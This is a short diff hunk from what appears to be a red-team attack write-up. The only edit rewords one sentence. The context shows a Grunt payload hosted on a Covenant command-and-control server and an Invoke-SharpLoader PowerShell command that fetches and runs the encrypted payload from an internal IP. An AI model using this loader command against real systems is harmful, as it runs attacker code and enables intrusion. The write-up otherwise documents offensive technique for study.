@@ -203,7 +203,7 @@ The whole attack is carried out on a low priv account.
 
     Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
 
-    Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
+    Adapt the Invoke-SharpLoader script to have it directly run with our encrypted payload by adding this to the last line:  
     ```
     Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
     ```
